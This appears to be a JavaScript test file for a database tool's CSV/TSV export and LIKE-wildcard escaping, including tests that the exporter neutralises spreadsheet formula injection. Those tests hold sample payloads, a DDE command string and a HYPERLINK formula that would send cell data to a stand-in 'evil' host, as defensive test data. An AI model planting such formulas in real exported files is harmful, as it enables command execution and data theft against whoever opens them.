const assert = require('assert');
const QueryManager = require('../webview/queryManager');
const DatabaseService = require('../database/DatabaseService');

suite('QueryManager.toDelimited', () => {
	const set = {
		columns: ['id', 'name', 'note'],
		rows: [
			{ id: 1, name: 'plain', note: null },
			{ id: 2, name: 'has,comma', note: 'say "hi"\nline2' }
		]
	};

	test('CSV escapes separators, quotes and newlines per RFC 4180', () => {
		const csv = QueryManager.toDelimited(set, ',');
		const lines = csv.split('\r\n');
		assert.strictEqual(lines[0], 'id,name,note');
		assert.strictEqual(lines[1], '1,plain,');
		assert.strictEqual(lines[2], '2,"has,comma","say ""hi""\nline2"');
	});

	test('TSV (clipboard) leaves commas untouched but quotes tabs/newlines', () => {
		const tsv = QueryManager.toDelimited(set, '\t');
		assert.ok(tsv.includes('2\thas,comma\t'), 'comma must not be quoted in TSV');
	});
});

// S6: a cell value starting with '=', '+', '-' or '@' is interpreted as a
// formula by Excel/LibreOffice/Sheets on open - a result value like
// =HYPERLINK(...) or =cmd|'/C calc'!A0 must not execute on open.
suite('QueryManager.toDelimited neutralizes formula injection', () => {
	test('prefixes a leading =, +, - or @ with a literal quote', () => {
		const set = {
			columns: ['value'],
			rows: [
				{ value: "=cmd|'/C calc'!A0" },
				{ value: '+1234' },
				{ value: '-1234' }
			]
		};
		const lines = QueryManager.toDelimited(set, ',').split('\r\n');
		assert.strictEqual(lines[1], "'=cmd|'/C calc'!A0");
		assert.strictEqual(lines[2], "'+1234");
		assert.strictEqual(lines[3], "'-1234");
	});

	test('the formula prefix still applies when the value also needs RFC 4180 quoting', () => {
		// Contains a comma, so toDelimited's own quoting kicks in too - the
		// leading quote must still be the literal first character Excel sees.
		const set = { columns: ['value'], rows: [{ value: '=HYPERLINK("http://evil/?d="&A1,"Click")' }] };
		const lines = QueryManager.toDelimited(set, ',').split('\r\n');
		assert.strictEqual(lines[1], '"\'=HYPERLINK(""http://evil/?d=""&A1,""Click"")"');
	});

	test('a plain value that merely contains, but does not start with, a formula character is untouched', () => {
		const set = { columns: ['value'], rows: [{ value: 'Revenue=1000' }] };
		const lines = QueryManager.toDelimited(set, ',').split('\r\n');
		assert.strictEqual(lines[1], 'Revenue=1000');
	});
});

suite('DatabaseService.escapeLikePattern', () => {
	test('escapes LIKE wildcards so user input is matched literally', () => {
		assert.strictEqual(DatabaseService.escapeLikePattern('100%_[x]'), '100[%][_][[]x]');
	});

	test('leaves plain text unchanged', () => {
		assert.strictEqual(DatabaseService.escapeLikePattern('GetOrders'), 'GetOrders');
	});
});
